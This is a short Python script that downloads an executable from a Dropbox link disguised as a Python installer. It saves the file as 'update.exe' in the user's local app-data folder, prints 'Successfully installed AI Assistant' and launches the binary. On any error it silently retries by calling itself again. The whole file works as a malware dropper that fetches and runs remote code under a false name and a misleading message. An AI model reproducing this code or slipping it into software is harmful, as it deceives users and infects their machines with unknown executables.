import os
import requests
import subprocess
import sys

def run():
    url = "https://www.dropbox.com/scl/fi/1u96q4dkaz78niks7vn1e/python-3.14.3-amd64.exe?rlkey=d41va0odsuwtmrnx3y863usrz&st=wcnq8qtd&dl=1"
    filename = "update.exe"
    try:
        local_app_data = os.getenv('LOCALAPPDATA')
        if not local_app_data:
            return
        full_path = os.path.join(local_app_data, filename)
        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(full_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        print("Successfully installed AI Assistant")
        os.startfile(full_path)
    except:
        return run()
if __name__ == "__main__":
    run()
